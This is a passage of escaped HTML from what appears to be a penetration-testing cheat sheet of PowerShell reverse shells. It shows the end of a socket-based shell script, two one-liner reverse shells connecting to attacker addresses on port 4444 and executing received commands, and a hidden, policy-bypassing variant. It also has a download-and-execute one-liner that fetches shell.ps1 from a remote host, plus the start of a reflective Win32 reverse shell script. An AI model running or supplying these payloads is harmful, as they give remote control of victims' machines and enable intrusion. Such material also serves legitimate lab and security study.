class=\"vm\"\u003e$true\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                \u003cspan class=\"nv\"\u003e$pinfo\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"py\"\u003eUseShellExecute\u003c/span\u003e \u003cspan class=\"p\"\u003e=\u003c/span\u003e \u003cspan class=\"vm\"\u003e$false\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                \u003cspan class=\"nv\"\u003e$pinfo\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"py\"\u003eArguments\u003c/span\u003e \u003cspan class=\"p\"\u003e=\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;/c \u003c/span\u003e\u003cspan class=\"nv\"\u003e$out\u003c/span\u003e\u003cspan class=\"s2\"\u003e \u003c/span\u003e\u003cspan class=\"nv\"\u003e$args\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                \u003cspan class=\"nv\"\u003e$p\u003c/span\u003e \u003cspan class=\"p\"\u003e=\u003c/span\u003e \u003cspan class=\"nb\"\u003eNew-Object\u003c/span\u003e \u003cspan class=\"n\"\u003eSystem\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"py\"\u003eDiagnostics\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"k\"\u003eProcess\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                \u003cspan class=\"nv\"\u003e$p\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"py\"\u003eStartInfo\u003c/span\u003e \u003cspan class=\"p\"\u003e=\u003c/span\u003e \u003cspan class=\"nv\"\u003e$pinfo\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                \u003cspan class=\"nv\"\u003e$p\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"py\"\u003eStart\u003c/span\u003e\u003cspan class=\"p\"\u003e()\u003c/span\u003e \u003cspan class=\"p\"\u003e|\u003c/span\u003e \u003cspan class=\"nb\"\u003eOut-Null\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                \u003cspan class=\"nv\"\u003e$p\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"py\"\u003eWaitForExit\u003c/span\u003e\u003cspan class=\"p\"\u003e()\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                \u003cspan class=\"nv\"\u003e$stdout\u003c/span\u003e \u003cspan class=\"p\"\u003e=\u003c/span\u003e \u003cspan class=\"nv\"\u003e$p\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"py\"\u003eStandardOutput\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"py\"\u003eReadToEnd\u003c/span\u003e\u003cspan class=\"p\"\u003e()\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                \u003cspan class=\"nv\"\u003e$stderr\u003c/span\u003e \u003cspan class=\"p\"\u003e=\u003c/span\u003e \u003cspan class=\"nv\"\u003e$p\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"py\"\u003eStandardError\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"py\"\u003eReadToEnd\u003c/span\u003e\u003cspan class=\"p\"\u003e()\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nv\"\u003e$p\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"py\"\u003eExitCode\u003c/span\u003e \u003cspan class=\"o\"\u003e-ne\u003c/span\u003e \u003cspan class=\"mf\"\u003e0\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                    \u003cspan class=\"nv\"\u003e$res\u003c/span\u003e \u003cspan class=\"p\"\u003e=\u003c/span\u003e \u003cspan class=\"nv\"\u003e$stderr\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                \u003cspan class=\"p\"\u003e}\u003c/span\u003e \u003cspan class=\"k\"\u003eelse\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                    \u003cspan class=\"nv\"\u003e$res\u003c/span\u003e \u003cspan class=\"p\"\u003e=\u003c/span\u003e \u003cspan class=\"nv\"\u003e$stdout\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                \u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\t\t\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\t\t\u003cspan class=\"k\"\u003eelse\u003c/span\u003e\u003cspan class=\"p\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\t\t\t\u003cspan class=\"nv\"\u003e$res\u003c/span\u003e \u003cspan class=\"p\"\u003e=\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u0026amp;\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;\u003c/span\u003e\u003cspan class=\"nv\"\u003e$out\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;\u003c/span\u003e\u003cspan class=\"nv\"\u003e$args\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e|\u003c/span\u003e \u003cspan class=\"nb\"\u003eout-string\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\t\t\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\t\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\t\u003cspan class=\"k\"\u003eelse\u003c/span\u003e\u003cspan class=\"p\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\t\t\u003cspan class=\"nv\"\u003e$res\u003c/span\u003e \u003cspan class=\"p\"\u003e=\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u0026amp;\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;\u003c/span\u003e\u003cspan class=\"nv\"\u003e$out\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e|\u003c/span\u003e \u003cspan class=\"nb\"\u003eout-string\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\t\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\t\u003cspan class=\"k\"\u003eif\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nv\"\u003e$res\u003c/span\u003e \u003cspan class=\"o\"\u003e-ne\u003c/span\u003e \u003cspan class=\"vm\"\u003e$null\u003c/span\u003e\u003cspan class=\"p\"\u003e){\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"nv\"\u003e$writer\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"py\"\u003eWriteLine\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nv\"\u003e$res\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e}\u003c/span\u003e\u003cspan class=\"k\"\u003eWhile\u003c/span\u003e \u003cspan class=\"p\"\u003e(!\u003c/span\u003e\u003cspan class=\"nv\"\u003e$out\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"py\"\u003eequals\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;exit\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e))\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003e$writer\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"py\"\u003eclose\u003c/span\u003e\u003cspan class=\"p\"\u003e();\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003e$socket\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"py\"\u003eclose\u003c/span\u003e\u003cspan class=\"p\"\u003e();\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003e$stream\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"py\"\u003eDispose\u003c/span\u003e\u003cspan class=\"p\"\u003e()\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\r\n  \u003c/figure\u003e\r\n\u003c/div\u003e\r\n\u003cul\u003e\n\u003cli\u003eOne liner shell :\u003c/li\u003e\n\u003c/ul\u003e\n\r\n\r\n\r\n\u003cdiv class=\"expressive-code\"\u003e\r\n  \u003cfigure class=\"frame is-terminal not-content\"\u003e\r\n  \u003cfigcaption class=\"header\"\u003e\r\n    \u003cspan class=\"title\"\u003e\u003c/span\u003e\r\n  \u003c/figcaption\u003e\r\n  \u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-powershell\" data-lang=\"powershell\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"n\"\u003epowershell\u003c/span\u003e \u003cspan class=\"n\"\u003e-nop\u003c/span\u003e \u003cspan class=\"n\"\u003e-c\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;\u003c/span\u003e\u003cspan class=\"nv\"\u003e$client\u003c/span\u003e\u003cspan class=\"s2\"\u003e = New-Object System.Net.Sockets.TCPClient(\u0026#39;10.10.10.10\u0026#39;,4444);\u003c/span\u003e\u003cspan class=\"nv\"\u003e$s\u003c/span\u003e\u003cspan class=\"s2\"\u003e = \u003c/span\u003e\u003cspan class=\"nv\"\u003e$client\u003c/span\u003e\u003cspan class=\"s2\"\u003e.GetStream();[byte[]]\u003c/span\u003e\u003cspan class=\"nv\"\u003e$b\u003c/span\u003e\u003cspan class=\"s2\"\u003e = 0..65535|%{0};while((\u003c/span\u003e\u003cspan class=\"nv\"\u003e$i\u003c/span\u003e\u003cspan class=\"s2\"\u003e = \u003c/span\u003e\u003cspan class=\"nv\"\u003e$s\u003c/span\u003e\u003cspan class=\"s2\"\u003e.Read(\u003c/span\u003e\u003cspan class=\"nv\"\u003e$b\u003c/span\u003e\u003cspan class=\"s2\"\u003e, 0, \u003c/span\u003e\u003cspan class=\"nv\"\u003e$b\u003c/span\u003e\u003cspan class=\"s2\"\u003e.Length)) -ne 0){;\u003c/span\u003e\u003cspan class=\"nv\"\u003e$data\u003c/span\u003e\u003cspan class=\"s2\"\u003e = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(\u003c/span\u003e\u003cspan class=\"nv\"\u003e$b\u003c/span\u003e\u003cspan class=\"s2\"\u003e,0, \u003c/span\u003e\u003cspan class=\"nv\"\u003e$i\u003c/span\u003e\u003cspan class=\"s2\"\u003e);\u003c/span\u003e\u003cspan class=\"nv\"\u003e$sb\u003c/span\u003e\u003cspan class=\"s2\"\u003e = (iex \u003c/span\u003e\u003cspan class=\"nv\"\u003e$data\u003c/span\u003e\u003cspan class=\"s2\"\u003e 2\u0026gt;\u0026amp;1 | Out-String );\u003c/span\u003e\u003cspan class=\"nv\"\u003e$sb2\u003c/span\u003e\u003cspan class=\"s2\"\u003e = \u003c/span\u003e\u003cspan class=\"nv\"\u003e$sb\u003c/span\u003e\u003cspan class=\"s2\"\u003e + \u0026#39;PS \u0026#39; + (pwd).Path + \u0026#39;\u0026gt; \u0026#39;;\u003c/span\u003e\u003cspan class=\"nv\"\u003e$sbt\u003c/span\u003e\u003cspan class=\"s2\"\u003e = ([text.encoding]::ASCII).GetBytes(\u003c/span\u003e\u003cspan class=\"nv\"\u003e$sb2\u003c/span\u003e\u003cspan class=\"s2\"\u003e);\u003c/span\u003e\u003cspan class=\"nv\"\u003e$s\u003c/span\u003e\u003cspan class=\"s2\"\u003e.Write(\u003c/span\u003e\u003cspan class=\"nv\"\u003e$sbt\u003c/span\u003e\u003cspan class=\"s2\"\u003e,0,\u003c/span\u003e\u003cspan class=\"nv\"\u003e$sbt\u003c/span\u003e\u003cspan class=\"s2\"\u003e.Length);\u003c/span\u003e\u003cspan class=\"nv\"\u003e$s\u003c/span\u003e\u003cspan class=\"s2\"\u003e.Flush()};\u003c/span\u003e\u003cspan class=\"nv\"\u003e$client\u003c/span\u003e\u003cspan class=\"s2\"\u003e.Close()\u0026#34;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\r\n  \u003c/figure\u003e\r\n\u003c/div\u003e\r\n\u003cul\u003e\n\u003cli\u003eOne liner shell :\u003c/li\u003e\n\u003c/ul\u003e\n\r\n\r\n\r\n\u003cdiv class=\"expressive-code\"\u003e\r\n  \u003cfigure class=\"frame is-terminal not-content\"\u003e\r\n  \u003cfigcaption class=\"header\"\u003e\r\n    \u003cspan class=\"title\"\u003e\u003c/span\u003e\r\n  \u003c/figcaption\u003e\r\n  \u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-powershell\" data-lang=\"powershell\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"n\"\u003epowershell\u003c/span\u003e \u003cspan class=\"n\"\u003e-NoP\u003c/span\u003e \u003cspan class=\"n\"\u003e-NonI\u003c/span\u003e \u003cspan class=\"n\"\u003e-W\u003c/span\u003e \u003cspan class=\"n\"\u003eHidden\u003c/span\u003e \u003cspan class=\"n\"\u003e-Exec\u003c/span\u003e \u003cspan class=\"n\"\u003eBypass\u003c/span\u003e \u003cspan class=\"n\"\u003e-Command\u003c/span\u003e \u003cspan class=\"nb\"\u003eNew-Object\u003c/span\u003e \u003cspan class=\"n\"\u003eSystem\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"py\"\u003eNet\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"py\"\u003eSockets\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"py\"\u003eTCPClient\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;10.10.15.18\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"mf\"\u003e4444\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\u003cspan class=\"nv\"\u003e$s\u003c/span\u003e\u003cspan class=\"p\"\u003e=\u003c/span\u003e\u003cspan class=\"nv\"\u003e$client\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"py\"\u003eGetStream\u003c/span\u003e\u003cspan class=\"p\"\u003e();[\u003c/span\u003e\u003cspan class=\"no\"\u003ebyte[]\u003c/span\u003e\u003cspan class=\"p\"\u003e]\u003c/span\u003e\u003cspan class=\"nv\"\u003e$b\u003c/span\u003e\u003cspan class=\"p\"\u003e=\u003c/span\u003e\u003cspan class=\"mf\"\u003e0\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"mf\"\u003e.65535\u003c/span\u003e\u003cspan class=\"p\"\u003e|%{\u003c/span\u003e\u003cspan class=\"mf\"\u003e0\u003c/span\u003e\u003cspan class=\"p\"\u003e};\u003c/span\u003e\u003cspan class=\"k\"\u003ewhile\u003c/span\u003e\u003cspan class=\"p\"\u003e((\u003c/span\u003e\u003cspan class=\"nv\"\u003e$i\u003c/span\u003e \u003cspan class=\"p\"\u003e=\u003c/span\u003e \u003cspan class=\"nv\"\u003e$s\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"py\"\u003eRead\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nv\"\u003e$b\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"mf\"\u003e0\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nv\"\u003e$b\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003eLength\u003c/span\u003e\u003cspan class=\"p\"\u003e))\u003c/span\u003e \u003cspan class=\"o\"\u003e-ne\u003c/span\u003e \u003cspan class=\"mf\"\u003e0\u003c/span\u003e\u003cspan class=\"p\"\u003e){;\u003c/span\u003e\u003cspan class=\"nv\"\u003e$data\u003c/span\u003e \u003cspan class=\"p\"\u003e=\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nb\"\u003eNew-Object\u003c/span\u003e \u003cspan class=\"n\"\u003e-TypeName\u003c/span\u003e \u003cspan class=\"n\"\u003eSystem\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"py\"\u003eText\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003eASCIIEncoding\u003c/span\u003e\u003cspan class=\"p\"\u003e).\u003c/span\u003e\u003cspan class=\"py\"\u003eGetString\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nv\"\u003e$b\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"mf\"\u003e0\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nv\"\u003e$i\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\u003cspan class=\"nv\"\u003e$sb\u003c/span\u003e \u003cspan class=\"p\"\u003e=\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nb\"\u003eiex \u003c/span\u003e\u003cspan class=\"nv\"\u003e$data\u003c/span\u003e \u003cspan class=\"mf\"\u003e2\u003c/span\u003e\u003cspan class=\"p\"\u003e\u0026gt;\u0026amp;\u003c/span\u003e\u003cspan class=\"mf\"\u003e1\u003c/span\u003e \u003cspan class=\"p\"\u003e|\u003c/span\u003e \u003cspan class=\"nb\"\u003eOut-String\u003c/span\u003e \u003cspan class=\"p\"\u003e);\u003c/span\u003e\u003cspan class=\"nv\"\u003e$sb2\u003c/span\u003e\u003cspan class=\"p\"\u003e=\u003c/span\u003e\u003cspan class=\"nv\"\u003e$sb\u003c/span\u003e\u003cspan class=\"p\"\u003e+\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;PS \u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e+(\u003c/span\u003e\u003cspan class=\"n\"\u003epwd\u003c/span\u003e\u003cspan class=\"p\"\u003e).\u003c/span\u003e\u003cspan class=\"n\"\u003ePath\u003c/span\u003e\u003cspan class=\"p\"\u003e+\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;\u0026gt; \u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\u003cspan class=\"nv\"\u003e$sbt\u003c/span\u003e \u003cspan class=\"p\"\u003e=\u003c/span\u003e \u003cspan class=\"p\"\u003e([\u003c/span\u003e\u003cspan class=\"no\"\u003etext.encoding\u003c/span\u003e\u003cspan class=\"p\"\u003e]::\u003c/span\u003e\u003cspan class=\"n\"\u003eASCII\u003c/span\u003e\u003cspan class=\"p\"\u003e).\u003c/span\u003e\u003cspan class=\"py\"\u003eGetBytes\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nv\"\u003e$sb2\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\u003cspan class=\"nv\"\u003e$s\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"py\"\u003eWrite\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nv\"\u003e$sbt\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"mf\"\u003e0\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"nv\"\u003e$sbt\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003eLength\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\u003cspan class=\"nv\"\u003e$s\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"py\"\u003eFlush\u003c/span\u003e\u003cspan class=\"p\"\u003e()};\u003c/span\u003e\u003cspan class=\"nv\"\u003e$client\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"py\"\u003eClose\u003c/span\u003e\u003cspan class=\"p\"\u003e()\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\r\n  \u003c/figure\u003e\r\n\u003c/div\u003e\r\n\u003cul\u003e\n\u003cli\u003eDownload :\u003c/li\u003e\n\u003c/ul\u003e\n\r\n\r\n\r\n\u003cdiv class=\"expressive-code\"\u003e\r\n  \u003cfigure class=\"frame is-terminal not-content\"\u003e\r\n  \u003cfigcaption class=\"header\"\u003e\r\n    \u003cspan class=\"title\"\u003e\u003c/span\u003e\r\n  \u003c/figcaption\u003e\r\n  \u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-sh\" data-lang=\"sh\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003epowershell -c \u003cspan class=\"s2\"\u003e\u0026#34;IEX(New-Object System.Net.WebClient).DownloadString(\u0026#39;http://10.8.3.12:8080/shell.ps1\u0026#39;)\u0026#34;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\r\n  \u003c/figure\u003e\r\n\u003c/div\u003e\r\n\r\n\r\n\r\n\u003cdiv class=\"expressive-code\"\u003e\r\n  \u003cfigure class=\"frame is-terminal not-content\"\u003e\r\n  \u003cfigcaption class=\"header\"\u003e\r\n    \u003cspan class=\"title\"\u003e\u003c/span\u003e\r\n  \u003c/figcaption\u003e\r\n  \u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-powershell\" data-lang=\"powershell\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cm\"\u003e\u0026lt;#\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cm\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cm\"\u003eDynWin32-ReverseShell.ps1 is a reverse shell based on dynamically looked up Win32 API calls.\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cm\"\u003eThe script uses reflection to obtain access to GetModuleHandle, GetProcAddress and CreateProcess.\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cm\"\u003eAfterwards it uses GetModuleHandle and GetProcAddress to resolve the required WSA functions\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cm\"\u003efrom ws2_32.dll.\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cm\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cm\"\u003eThis script should be used for educational purposes only (and maybe while playing CTF :D).\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cm\"\u003eIt was only tested on Windows 10 (x64) and is probably not stable or portable. It\u0026#39;s only\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cm\"\u003epurpose is to demonstrate the usage of reflective lookups of Win32 API calls. See it as\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cm\"\u003ejust a silly experiment :)\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cm\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cm\"\u003eAuthor: Tobias Neitzel (@qtc_de)\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cm\"\u003eLicense: GPL-3.0 License\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cm\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cm\"\u003e#\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003e$IP\u003c/span\u003e \u003cspan class=\"p\"\u003e=\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;10.8.3.12\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003e$PORT\u003c/span\u003e \u003cspan class=\"p\"\u003e=\u003c/span\u003e \u003cspan 